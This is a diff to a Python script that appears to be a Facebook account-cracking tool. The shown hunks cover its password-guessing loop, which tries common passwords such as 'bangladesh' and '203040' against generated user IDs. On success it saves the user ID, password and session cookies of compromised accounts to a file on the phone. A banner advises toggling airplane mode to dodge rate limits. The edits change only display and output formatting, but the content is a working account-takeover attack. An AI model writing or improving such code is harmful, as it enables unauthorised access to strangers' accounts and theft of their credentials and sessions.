@@ -238,7 +238,7 @@ def i():
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
         print('\033[38;5;46--------------------------------------------')
-        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97m 2/5MIN ⪼ \033[1;34m⧼\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m⧽ \033[1;97mAIRPLANE MODE")
+        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97m 2/5MIN ⪼ \033⧼1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
             pwx = [love,'bangladesh','203040','121234','708090','0987654']
@@ -287,7 +287,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ')                
-                open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+coki+'\n')
+                open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
